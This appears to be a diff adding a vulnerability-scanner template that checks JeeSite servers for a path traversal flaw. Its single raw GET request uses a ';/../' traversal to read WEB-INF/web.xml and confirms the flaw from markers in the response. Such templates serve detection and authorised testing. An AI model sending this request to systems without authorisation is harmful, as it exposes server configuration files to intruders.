@@ -1,0 +1,23 @@
+id: jeesite-userfiles-path-traversal
+
+info:
+  name: JeeSite Userfiles Path Traversal
+  author: qwtd
+  severity: medium
+  description: JeeSite Userfiles path traversal vulnerability.
+  tags: JeeSite
+
+http:
+  - raw:
+      - |
+        GET /userfiles;/userfiles/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<display-name>"
+          - "thinkgem.jeesite"
+          - "<listener-class>"
+        condition: and
